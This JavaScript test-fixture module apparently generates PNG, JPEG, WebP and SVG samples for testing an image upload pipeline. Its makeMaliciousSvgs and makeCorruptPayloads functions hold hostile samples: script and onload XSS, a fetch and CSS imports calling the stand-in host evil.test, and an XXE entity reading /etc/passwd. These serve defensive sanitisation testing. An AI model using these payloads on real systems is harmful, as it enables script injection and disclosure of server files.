import crypto from 'node:crypto';
import zlib from 'node:zlib';

export function sha256Hex(bufOrStr) {
  return crypto.createHash('sha256').update(bufOrStr).digest('hex');
}

// ── IEEE CRC32 for PNG chunks ──
const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n += 1) {
    let c = n;
    for (let k = 0; k < 8; k += 1) {
      c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
    }
    table[n] = c >>> 0;
  }
  return table;
})();

function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i += 1) {
    c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  }
  return (c ^ 0xffffffff) >>> 0;
}

function makePngChunk(type, data) {
  const typeBuf = Buffer.from(type, 'ascii');
  const lenBuf = Buffer.alloc(4);
  lenBuf.writeUInt32BE(data.length, 0);
  const crcInput = Buffer.concat([typeBuf, data]);
  const crcBuf = Buffer.alloc(4);
  crcBuf.writeUInt32BE(crc32(crcInput), 0);
  return Buffer.concat([lenBuf, typeBuf, data, crcBuf]);
}

/**
 * Generates a valid RGBA PNG accepted by PHP 8.2.29 GD (`imagecreatefrompng` / `getimagesizefromstring`).
 * Defaults to 400x400 so WordPress generates `thumbnail` (150x150) & `medium` (300x300) derivatives.
 */
export function makePng(width = 400, height = 400, options = {}) {
  const {
    rgba1 = [22, 163, 74, 255],
    rgba2 = [15, 23, 42, 255],
    nonce = '',
  } = options;

  const signature = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 6; // RGBA
  ihdr[10] = 0;
  ihdr[11] = 0;
  ihdr[12] = 0;

  const rowStride = 1 + width * 4;
  const raw = Buffer.alloc(rowStride * height);
  for (let y = 0; y < height; y += 1) {
    const rowOff = y * rowStride;
    raw[rowOff] = 0; // filter None
    for (let x = 0; x < width; x += 1) {
      const c = (((x >> 3) + (y >> 3)) & 1) === 0 ? rgba1 : rgba2;
      const pOff = rowOff + 1 + x * 4;
      raw[pOff] = c[0];
      raw[pOff + 1] = c[1];
      raw[pOff + 2] = c[2];
      raw[pOff + 3] = c[3];
    }
  }
  const idatData = zlib.deflateSync(raw);

  const chunks = [
    signature,
    makePngChunk('IHDR', ihdr),
    makePngChunk('IDAT', idatData),
  ];
  if (nonce) {
    chunks.push(makePngChunk('tEXt', Buffer.from(`f2e-nonce\0${nonce}`, 'utf8')));
  }
  chunks.push(makePngChunk('IEND', Buffer.alloc(0)));
  return Buffer.concat(chunks);
}

/**
 * Generates an oversized (>10 MB) valid PNG buffer for boundary testing.
 */
export function makeOversizedPng(targetMinBytes = 10 * 1024 * 1024 + 64) {
  const base = makePng(32, 32, { nonce: 'oversized-base' });
  // Insert a large tEXt chunk before IEND (last 12 bytes)
  const payloadLen = targetMinBytes - base.length;
  const textPayload = Buffer.alloc(Math.max(1024, payloadLen), 0x41);
  Buffer.from('f2e-pad\0', 'ascii').copy(textPayload, 0);
  const padChunk = makePngChunk('tEXt', textPayload);
  return Buffer.concat([
    base.subarray(0, base.length - 12),
    padChunk,
    base.subarray(base.length - 12),
  ]);
}

// ── Baseline SOF0 4:4:4 JPEG Generator (verified against PHP 8.2.29 GD) ──
const STD_DC_LUM_BITS = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0];
const STD_DC_LUM_VALS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11];
const STD_DC_CHR_BITS = [0, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0];
const STD_DC_CHR_VALS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11];
// Minimal 1-symbol AC table: symbol 0x00 (EOB) = 1-bit code 0
const MIN_AC_BITS = [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
const MIN_AC_VALS = [0x00];

function buildHuffmanMap(bits, vals) {
  const map = new Map();
  let code = 0;
  let idx = 0;
  for (let len = 1; len <= 16; len += 1) {
    const count = bits[len - 1];
    for (let i = 0; i < count; i += 1) {
      map.set(vals[idx], { code, len });
      idx += 1;
      code += 1;
    }
    code <<= 1;
  }
  return map;
}

const DC_LUM_MAP = buildHuffmanMap(STD_DC_LUM_BITS, STD_DC_LUM_VALS);
const DC_CHR_MAP = buildHuffmanMap(STD_DC_CHR_BITS, STD_DC_CHR_VALS);

function makeDhtSegment(tableClassAndId, bits, vals) {
  const payload = Buffer.from([tableClassAndId, ...bits, ...vals]);
  const hdr = Buffer.alloc(4);
  hdr[0] = 0xff;
  hdr[1] = 0xc4;
  hdr.writeUInt16BE(payload.length + 2, 2);
  return Buffer.concat([hdr, payload]);
}

function makeDqtSegment(tableId, qVal = 1) {
  const payload = Buffer.alloc(65, qVal);
  payload[0] = tableId;
  const hdr = Buffer.alloc(4);
  hdr[0] = 0xff;
  hdr[1] = 0xdb;
  hdr.writeUInt16BE(payload.length + 2, 2);
  return Buffer.concat([hdr, payload]);
}

/**
 * Generates a Baseline SOF0 4:4:4 JPEG accepted by PHP 8.2.29 GD (`imagecreatefromjpeg`).
 * Dimensions are rounded up to a multiple of 8 internally if needed; default 400x400.
 */
export function makeJpeg(width = 400, height = 400, options = {}) {
  const {
    rgb1 = [23, 163, 74],
    rgb2 = [15, 23, 42],
    nonce = '',
  } = options;

  const toYCbCr = ([r, g, b]) => {
    const y = Math.max(0, Math.min(255, Math.round(0.299 * r + 0.587 * g + 0.114 * b)));
    const cb = Math.max(0, Math.min(255, Math.round(128 - 0.168736 * r - 0.331264 * g + 0.5 * b)));
    const cr = Math.max(0, Math.min(255, Math.round(128 + 0.5 * r - 0.418688 * g - 0.081312 * b)));
    return [y, cb, cr];
  };
  const ycc1 = toYCbCr(rgb1);
  const ycc2 = toYCbCr(rgb2);

  const segments = [];
  // SOI
  segments.push(Buffer.from([0xff, 0xd8]));
  // APP0 JFIF 1.01
  segments.push(Buffer.from([
    0xff, 0xe0, 0x00, 0x10,
    0x4a, 0x46, 0x49, 0x46, 0x00,
    0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
  ]));
  // Optional COM marker for per-run uniqueness
  if (nonce) {
    const comData = Buffer.from(`F2E-E2E:${nonce}`, 'utf8');
    const comHdr = Buffer.alloc(4);
    comHdr[0] = 0xff;
    comHdr[1] = 0xfe;
    comHdr.writeUInt16BE(comData.length + 2, 2);
    segments.push(Buffer.concat([comHdr, comData]));
  }
  // DQT 0 & 1 (quantization = 1 so DC coeff = (val - 128) * 8)
  segments.push(makeDqtSegment(0, 1));
  segments.push(makeDqtSegment(1, 1));
  // SOF0 4:4:4
  const sof0 = Buffer.alloc(19);
  sof0[0] = 0xff; sof0[1] = 0xc0;
  sof0.writeUInt16BE(17, 2);
  sof0[4] = 8;
  sof0.writeUInt16BE(height, 5);
  sof0.writeUInt16BE(width, 7);
  sof0[9] = 3;
  sof0[10] = 1; sof0[11] = 0x11; sof0[12] = 0;
  sof0[13] = 2; sof0[14] = 0x11; sof0[15] = 1;
  sof0[16] = 3; sof0[17] = 0x11; sof0[18] = 1;
  segments.push(sof0);

  // DHTs: DC 0, DC 1, AC 0 (0x10), AC 1 (0x11)
  segments.push(makeDhtSegment(0x00, STD_DC_LUM_BITS, STD_DC_LUM_VALS));
  segments.push(makeDhtSegment(0x01, STD_DC_CHR_BITS, STD_DC_CHR_VALS));
  segments.push(makeDhtSegment(0x10, MIN_AC_BITS, MIN_AC_VALS));
  segments.push(makeDhtSegment(0x11, MIN_AC_BITS, MIN_AC_VALS));

  // SOS header
  segments.push(Buffer.from([
    0xff, 0xda, 0x00, 0x0c,
    0x03,
    0x01, 0x00,
    0x02, 0x11,
    0x03, 0x11,
    0x00, 0x3f, 0x00,
  ]));

  // Bit writer (MSB-first with 0xFF -> 0xFF 0x00 stuffing)
  const sosBytes = [];
  let bitBuf = 0;
  let bitCount = 0;
  const writeBits = (code, len) => {
    for (let i = len - 1; i >= 0; i -= 1) {
      bitBuf = (bitBuf << 1) | ((code >>> i) & 1);
      bitCount += 1;
      if (bitCount === 8) {
        sosBytes.push(bitBuf);
        if (bitBuf === 0xff) sosBytes.push(0x00);
        bitBuf = 0;
        bitCount = 0;
      }
    }
  };

  const encodeDiff = (diff, huffMap) => {
    if (diff === 0) {
      const sym = huffMap.get(0);
      writeBits(sym.code, sym.len);
      return;
    }
    const abs = Math.abs(diff);
    let cat = 0;
    let tmp = abs;
    while (tmp > 0) {
      cat += 1;
      tmp >>= 1;
    }
    const sym = huffMap.get(cat);
    writeBits(sym.code, sym.len);
    const valBits = diff > 0 ? diff : ((1 << cat) - 1 + diff);
    writeBits(valBits, cat);
  };

  const mcuW = Math.ceil(width / 8);
  const mcuH = Math.ceil(height / 8);
  let prevY = 0;
  let prevCb = 0;
  let prevCr = 0;

  for (let my = 0; my < mcuH; my += 1) {
    for (let mx = 0; mx < mcuW; mx += 1) {
      const ycc = ((mx + my) & 1) === 0 ? ycc1 : ycc2;
      const dcY = (ycc[0] - 128) * 8;
      const dcCb = (ycc[1] - 128) * 8;
      const dcCr = (ycc[2] - 128) * 8;

      encodeDiff(dcY - prevY, DC_LUM_MAP);
      writeBits(0, 1); // AC EOB
      prevY = dcY;

      encodeDiff(dcCb - prevCb, DC_CHR_MAP);
      writeBits(0, 1);
      prevCb = dcCb;

      encodeDiff(dcCr - prevCr, DC_CHR_MAP);
      writeBits(0, 1);
      prevCr = dcCr;
    }
  }

  if (bitCount > 0) {
    const pad = 8 - bitCount;
    writeBits((1 << pad) - 1, pad);
  }
  segments.push(Buffer.from(sosBytes));
  // EOI
  segments.push(Buffer.from([0xff, 0xd9]));
  return Buffer.concat(segments);
}

/**
 * Generates a lossless VP8L WebP accepted by PHP 8.2.29 GD (`imagecreatefromwebp` / `getimagesizefromstring`).
 * Embeds optional `nonce` deterministically into `rgba2` RGB bytes so SHA-256 is unique per run.
 */
export function makeWebpVP8L(width = 400, height = 400, options = {}) {
  const {
    rgba1 = [15, 23, 42, 255],
    nonce = '',
  } = options;
  let rgba2 = options.rgba2 ? [...options.rgba2] : [22, 163, 74, 255];

  if (nonce && !options.rgba2) {
    const digest = crypto.createHash('sha256').update(String(nonce)).digest();
    rgba2 = [
      (digest[0] & 0xfe) | (rgba1[0] === digest[0] ? 1 : 0),
      digest[1],
      digest[2],
      255,
    ];
    if (rgba2[0] === rgba1[0] && rgba2[1] === rgba1[1] && rgba2[2] === rgba1[2]) {
      rgba2[0] = (rgba2[0] + 17) & 0xff;
    }
  }

  // LSB-first bit writer for VP8L
  const outBytes = [0x2f]; // VP8L signature byte
  let curByte = 0;
  let bitPos = 0;
  const writeBits = (val, nBits) => {
    for (let i = 0; i < nBits; i += 1) {
      if ((val >>> i) & 1) {
        curByte |= (1 << bitPos);
      }
      bitPos += 1;
      if (bitPos === 8) {
        outBytes.push(curByte);
        curByte = 0;
        bitPos = 0;
      }
    }
  };

  // Header: 14-bit (width - 1), 14-bit (height - 1), 1-bit alpha_is_used=1, 3-bit version=0
  writeBits(width - 1, 14);
  writeBits(height - 1, 14);
  writeBits(1, 1);
  writeBits(0, 3);

  // No transform, no color cache, no meta prefix codes
  writeBits(0, 1);
  writeBits(0, 1);
  writeBits(0, 1);

  // Prefix codes order in VP8L: Green (1), Red (0), Blue (2), Alpha (3), Distance
  const channels = [1, 0, 2, 3];
  const differing = [];
  for (const ch of channels) {
    const v0 = rgba1[ch];
    const v1 = rgba2[ch];
    if (v0 === v1) {
      // Simple Prefix Code, 1 symbol (num_symbols - 1 = 0), is_first_8bits = 1
      writeBits(1, 1);
      writeBits(0, 1);
      writeBits(1, 1);
      writeBits(v0, 8);
      differing.push(false);
    } else {
      // Simple Prefix Code, 2 symbols (num_symbols - 1 = 1), is_first_8bits = 1
      writeBits(1, 1);
      writeBits(1, 1);
      writeBits(1, 1);
      writeBits(v0, 8);
      writeBits(v1, 8);
      differing.push(true);
    }
  }

  // Distance prefix code: 1 symbol (0)
  writeBits(1, 1);
  writeBits(0, 1);
  writeBits(0, 1);
  writeBits(0, 1);

  // Pixels in row-major order
  for (let y = 0; y < height; y += 1) {
    for (let x = 0; x < width; x += 1) {
      const bit = (((x >> 3) + (y >> 3)) & 1);
      for (let i = 0; i < 4; i += 1) {
        if (differing[i]) {
          writeBits(bit, 1);
        }
      }
    }
  }

  if (bitPos > 0) {
    outBytes.push(curByte);
  }

  const vp8l = Buffer.from(outBytes);
  const padByte = vp8l.length % 2 === 1 ? Buffer.from([0x00]) : Buffer.alloc(0);
  const riffSize = 4 + 8 + vp8l.length + padByte.length;

  const header = Buffer.alloc(20);
  header.write('RIFF', 0, 'ascii');
  header.writeUInt32LE(riffSize, 4);
  header.write('WEBP', 8, 'ascii');
  header.write('VP8L', 12, 'ascii');
  header.writeUInt32LE(vp8l.length, 16);

  return Buffer.concat([header, vp8l, padByte]);
}

export function makeCorruptPayloads() {
  return {
    htmlAsPng: Buffer.from('<html><script>alert(1)</script></html>', 'utf8'),
    truncatedPng: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a]),
    aviAsWebp: Buffer.from('RIFF\x00\x00\x00\x00AVI LIST', 'latin1'),
    invalidBase64: '!!!not-valid-base64-payload!!!',
  };
}

export function makeValidSvg({ width = 48, height = 48, color = '#16A34A', nonce = '' } = {}) {
  const desc = nonce ? `<desc>F2E-E2E-${nonce}</desc>` : '';
  return `<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">${desc}<defs><linearGradient id="paint0_linear_1_1" x1="0" y1="0" x2="${width}" y2="${height}" gradientUnits="userSpaceOnUse"><stop stop-color="${color}"/><stop offset="1" stop-color="#0F172A"/></linearGradient></defs><rect width="${width}" height="${height}" rx="12" fill="url(#paint0_linear_1_1)"/><path d="M12 24L20 32L36 16" stroke="#FFFFFF" stroke-width="3" fill="none"/></svg>`;
}

export function makeDuplicateDefsSvgs(nonce = '') {
  const desc1 = nonce ? `<desc>F2E-E2E-${nonce}-1</desc>` : '';
  const desc2 = nonce ? `<desc>F2E-E2E-${nonce}-2</desc>` : '';
  const svgA = `<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">${desc1}<defs><clipPath id="clip0_1_2"><rect width="48" height="48" rx="8"/></clipPath><linearGradient id="paint0_linear_1_1" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#16A34A"/><stop offset="1" stop-color="#22C55E"/></linearGradient></defs><g clip-path="url(#clip0_1_2)"><rect width="48" height="48" fill="url(#paint0_linear_1_1)"/></g></svg>`;
  const svgB = `<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">${desc2}<defs><clipPath id="clip0_1_2"><circle cx="24" cy="24" r="22"/></clipPath><linearGradient id="paint0_linear_1_1" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#0F172A"/><stop offset="1" stop-color="#334155"/></linearGradient></defs><g clip-path="url(#clip0_1_2)"><rect width="48" height="48" fill="url(#paint0_linear_1_1)"/></g></svg>`;
  return [svgA, svgB];
}

export function makeMaliciousSvgs(nonce = '') {
  const desc = nonce ? `<desc>F2E-E2E-${nonce}</desc>` : '';
  return {
    scriptAndEvents: `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" onload="alert(1)">${desc}<script>alert('xss')</script><rect width="32" height="32" fill="#16A34A" onclick="fetch('https://evil.test')"/></svg>`,
    cssImportAndForeignObject: `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">${desc}<style>@import "https://evil.test/x.css"; rect{fill:url(https://evil.test/p.png)}</style><foreignObject width="32" height="32"><body onload="alert(1)">x</body></foreignObject><animate attributeName="x" from="0" to="10"/><use href="https://evil.test/x.svg#a"/><rect width="32" height="32" fill="#0F172A"/></svg>`,
    embeddedImageAndXxe: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32">${desc}<image xlink:href="data:image/png;base64,iVBORw0KGgo=" width="16" height="16"/><rect width="32" height="32" fill="#2563EB"/></svg>`,
  };
}

export function makeMalformedSvg() {
  return '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"';
}

export function svgToBase64Uri(svg) {
  return `data:image/svg+xml;base64,${Buffer.from(svg, 'utf8').toString('base64')}`;
}

export function svgToUtf8Uri(svg) {
  return `data:image/svg+xml;utf8,${encodeURIComponent(svg)}`;
}

export function bufferToDataUri(buf, mime) {
  return `data:${mime};base64,${Buffer.from(buf).toString('base64')}`;
}
